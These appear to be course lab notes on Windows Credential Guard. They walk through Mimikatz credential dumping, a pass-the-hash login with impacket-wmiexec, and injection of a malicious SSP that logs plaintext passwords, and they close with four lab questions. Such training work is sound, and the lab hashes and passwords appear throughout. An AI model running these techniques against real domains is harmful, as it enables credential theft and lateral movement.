# Windows Credential Guard

Logging in to the CLIENTWK246 machine as a Domain Administrator
>``` shell
>kali@kali:~$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution
>```

Obtaninig the cached NTLM hash for the CORP\Administrator user
>``` shell
>PS C:\Users\offsec> cd C:\tools\mimikatz\
>
>PS C:\tools\mimikatz> .\mimikatz.exe
>
># ========== Expected Result ==========
>  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
> ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
>  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
># =====================================
>
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz # sekurlsa::logonpasswords
>
># ========== Expected Result ==========
>Authentication Id : 0 ; 5795018 (00000000:00586cca)
>Session           : RemoteInteractive from 6
>User Name         : offsec
>Domain            : CLIENTWK246
>Logon Server      : CLIENTWK246
>Logon Time        : 9/19/2024 2:08:43 AM
>SID               : S-1-5-21-180219712-1214652076-1814130762-1002
>        msv :
>         [00000003] Primary
>         * Username : offsec
>         * Domain   : CLIENTWK246
>         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e
>         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3
>         * DPAPI    : a188967ac5edb88eca3301f93f756ca8
>        tspkg :
>        wdigest :       KO
>        kerberos :
>         * Username : offsec
>         * Domain   : CLIENTWK246
>         * Password : (null)
>        ssp :
>        credman :
>        cloudap :
>...
>Authentication Id : 0 ; 5468350 (00000000:005370be)
>Session           : RemoteInteractive from 5
>User Name         : Administrator
>Domain            : CORP
>Logon Server      : SERVERWK248
>Logon Time        : 9/19/2024 2:08:28 AM
>SID               : S-1-5-21-1711441587-1152167230-1972296030-500
>        msv :
>         [00000003] Primary
>         * Username : Administrator
>         * Domain   : CORP
>         * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
>         * SHA1     : 2b26e304f13c21b8feca7dcedb5bd480464f73b4
>         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
>        tspkg :
>        wdigest :       KO
>        kerberos :
>         * Username : Administrator
>         * Domain   : CORP.COM
>         * Password : (null)
>        ssp :
>        credman :
>        cloudap :
># =====================================
>```

Gaining access to the SERVERWK248 machine as CORP\Administrator
>``` shell
>kali@kali:~$ impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
>
># ========== Expected Result ==========
>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
>
>[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
>[*] SMBv3.0 dialect used
>[+] Target system is 192.168.50.248 and isFQDN is False
>[+] StringBinding: SERVERWK248[64285]
>[+] StringBinding: 192.168.50.248[64285]
>[+] StringBinding chosen: ncacn_ip_tcp:192.168.50.248[64285]
>[!] Launching semi-interactive shell - Careful what you execute
>[!] Press help for extra shell commands
>C:\>
># =====================================
>```

Logging in to the CLIENTWK245 machine as a Domain Administrator
>``` shell
>kali@kali:~$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
>```

Verifying that Credential Guard is enabled
>``` shell
>PS C:\Users\offsec> Get-ComputerInfo
>
># ========== Expected Result ==========
>WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
>WindowsCurrentVersion                                   : 6.3
>WindowsEditionId                                        : Enterprise
>...
>HyperVisorPresent                                       : True
>HyperVRequirementDataExecutionPreventionAvailable       :
>HyperVRequirementSecondLevelAddressTranslation          :
>HyperVRequirementVirtualizationFirmwareEnabled          :
>HyperVRequirementVMMonitorModeExtensions                :
>DeviceGuardSmartStatus                                  : Off
>DeviceGuardRequiredSecurityProperties                   : {BaseVirtualizationSupport, SecureBoot}
>DeviceGuardAvailableSecurityProperties                  : {BaseVirtualizationSupport, SecureBoot, DMAProtection, SecureMemoryOverwrite...}
>DeviceGuardSecurityServicesConfigured                   : {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
>DeviceGuardSecurityServicesRunning                      : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
>DeviceGuardCodeIntegrityPolicyEnforcementStatus         : EnforcementMode
>DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : AuditMode
># =====================================
>```

Looking at the information obtained by Mimikatz for the CORP\Administrator user
>``` shell
>PS C:\Users\offsec> cd C:\tools\mimikatz\
>
>PS C:\tools\mimikatz> .\mimikatz.exe
>
># ========== Expected Result ==========
>  .#####.   mimikatz 2.2.0 (x64) #19041 Oct 20 2023 07:20:39
> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
> ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
>  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
># =====================================
>
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz # sekurlsa::logonpasswords
>
># ========== Expected Result ==========
>...
>Authentication Id : 0 ; 4214404 (00000000:00404e84)
>Session           : RemoteInteractive from 4
>User Name         : Administrator
>Domain            : CORP
>Logon Server      : SERVERWK248
>Logon Time        : 9/19/2024 4:39:07 AM
>SID               : S-1-5-21-1711441587-1152167230-1972296030-500
>        msv :
>         [00000003] Primary
>         * Username : Administrator
>         * Domain   : CORP
>           * LSA Isolated Data: NtlmHash
>             KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
>             Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
>             AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
>             Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
>         * DPAPI    : 8218a675635dab5b43dca6ba9df6fb7e
>        tspkg :
>        wdigest :       KO
>        kerberos :
>         * Username : Administrator
>         * Domain   : CORP.COM
>         * Password : (null)
>        ssp :
>        credman :
>        cloudap :
>...
># =====================================
>```

Injecting a malicious SSP using Mimikatz
>``` shell
>mimikatz # privilege::debug
>
># ========== Expected Result ==========
>Privilege '20' OK
># =====================================
>
>mimikatz # misc::memssp
>
># ========== Expected Result ==========
>Injected =)
># =====================================
>```

Logging in to the CLIENTWK245 machine as a Domain Administrator
>``` shell
>kali@kali:~$ xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
>```

Checking the contents of the mimilsa.log file
>``` shell
>PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
>
># ========== Expected Result ==========
>[00000000:00aeb773] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
>[00000000:00aebd86] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
>[00000000:00aebf6f] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
>[00000000:00af2311] CORP\Administrator  QWERTY123!@#
>[00000000:00404e84] CORP\Administrator  Šd
>[00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
>[00000000:00b174fa] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
>[00000000:00b177a7] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
>[00000000:00b1dd77] CLIENTWK245\offsec  lab
>[00000000:00b1de21] CLIENTWK245\offsec  lab
># =====================================
>```

Lab 1 - Start VM Group 1 and repeat the steps discussed in this section. What domain does the Administrator user extracted from Mimikatz belong to?
>``` shell
>
>```
>

Lab 2 - What is the name of the hypervisor developed by Microsoft?
>``` shell
>
>```
>

Lab 3 - In which Virtual Trust Level (VTL) can LSAISO.exe be found?
>``` shell
>
>```
>

Lab 4 - In what format must Security Support Providers be in to register in lsass.exe?
>``` shell
>
>```
>
